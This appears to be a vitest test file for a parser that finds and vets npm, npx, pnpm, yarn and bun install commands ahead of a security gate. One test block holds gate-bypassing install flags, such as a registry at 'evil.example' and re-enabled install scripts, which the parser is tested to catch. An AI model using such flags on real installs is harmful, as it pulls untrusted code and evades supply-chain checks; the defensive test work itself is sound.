import { describe, expect, test } from "vitest";
import { findInstalls, parseSpec } from "../lib/install-commands.mjs";

const specsOf = (command) => findInstalls(command).map((f) => f.specs);

describe("findInstalls", () => {
  test.each([
    "git status",
    "npm install",
    "npm ci",
    "npm install --legacy-peer-deps",
    "npm run build",
    "npm uninstall lodash",
    "echo 'npm install left-pad'",
    'git commit -m "npm install left-pad"',
    "npx -c 'eslint .'",
    "pnpm install --frozen-lockfile",
    "yarn",
    "bun install",
  ])("finds nothing to vet in `%s`", (command) => {
    expect(findInstalls(command)).toEqual([]);
  });

  test.each([
    ["npm install date-fns", [["date-fns"]]],
    ["npm i -D @types/node vitest", [["@types/node", "vitest"]]],
    ["npm add zod", [["zod"]]],
    ["npm isntall zod", [["zod"]]],
    ["npm -g install serve", [["serve"]]],
    ["npm install --prefix sub left-pad", [["left-pad"]]],
    ['npm install "lodash@^4"', [["lodash@^4"]]],
    ["npm install zod@3.23.8 2>&1 | tail -5", [["zod@3.23.8"]]],
    ["npm install zod > /tmp/out.log", [["zod"]]],
    ["npm install a && npm install b", [["a"], ["b"]]],
  ])("reads the packages of `%s`", (command, expected) => {
    expect(specsOf(command)).toEqual(expected);
  });

  test("puts the flags right after the install subcommand", () => {
    const command = "FOO=1 npm i -D zod";
    const [found] = findInstalls(command);
    expect(command.slice(0, found.insertAt)).toBe("FOO=1 npm i");
  });

  test("remembers the directory a preceding cd moved into", () => {
    const [found] = findInstalls("cd /tmp/wt/TASK-001 && npm install zod");
    expect(found.cwd).toBe("/tmp/wt/TASK-001");
  });

  test.each([
    ["npm install zod --registry https://evil.example", ["--registry"]],
    [
      "npm install zod --registry=https://evil.example",
      ["--registry=https://evil.example"],
    ],
    ["npm install zod --min-release-age=0", ["--min-release-age=0"]],
    ["npm install zod --before 2030-01-01", ["--before"]],
    ["npm install zod --no-ignore-scripts", ["--no-ignore-scripts"]],
    ["npm install zod --ignore-scripts=false", ["--ignore-scripts=false"]],
    [
      "npx --registry=https://evil.example zod",
      ["--registry=https://evil.example"],
    ],
  ])("flags `%s` as overriding a gate-owned setting", (command, flags) => {
    const [found] = findInstalls(command);
    expect(found.gateFlags).toEqual(flags);
    expect(found.specs).toEqual(["zod"]);
  });

  describe("npx and npm exec", () => {
    test("a bare command name may be a local bin", () => {
      const [found] = findInstalls("npx prettier --check .");
      expect(found).toMatchObject({
        kind: "exec",
        specs: ["prettier"],
        binOnly: true,
      });
    });

    test("arguments after the command are not packages", () => {
      expect(
        specsOf("npx -y create-vite@latest my-app --template react"),
      ).toEqual([["create-vite@latest"]]);
    });

    test("--package names what is fetched, and is never a local bin", () => {
      const [found] = findInstalls("npx -p typescript --package=ts-node tsc");
      expect(found).toMatchObject({
        specs: ["typescript", "ts-node"],
        binOnly: false,
      });
    });

    test("npm exec reads the command after --", () => {
      expect(specsOf("npm exec --yes -- cowsay hi")).toEqual([["cowsay"]]);
      expect(specsOf("npm x cowsay")).toEqual([["cowsay"]]);
    });
  });

  test.each([
    "pnpm add zod",
    "pnpm i zod",
    "pnpm dlx create-vite",
    "pnpx create-vite",
    "yarn add zod",
    "yarn global add serve",
    "yarn dlx create-vite",
    "bun add zod",
    "bunx cowsay",
    "bun x cowsay",
  ])("marks `%s` as another manager's install", (command) => {
    expect(findInstalls(command)).toMatchObject([{ kind: "other" }]);
  });
});

describe("parseSpec", () => {
  test.each([
    ["zod", { name: "zod", version: "" }],
    ["zod@3.23.8", { name: "zod", version: "3.23.8" }],
    ["react@next", { name: "react", version: "next" }],
    ["react@^18", { name: "react", version: "^18" }],
    ["@types/node", { name: "@types/node", version: "" }],
    [
      "@tanstack/react-query@5",
      { name: "@tanstack/react-query", version: "5" },
    ],
    ["JSONStream", { name: "JSONStream", version: "" }],
  ])("splits the registry spec `%s`", (spec, expected) => {
    expect(parseSpec(spec)).toEqual(expected);
  });

  test.each([
    "github:user/repo",
    "user/repo",
    "git+https://github.com/user/repo.git",
    "https://example.com/pkg.tgz",
    "./local-pkg",
    "../sibling",
    "file:../sibling",
    "pkg.tgz",
    "alias@npm:zod",
    "$PKG",
  ])("refuses `%s` as not a plain registry package", (spec) => {
    expect(parseSpec(spec)).toBeNull();
  });
});
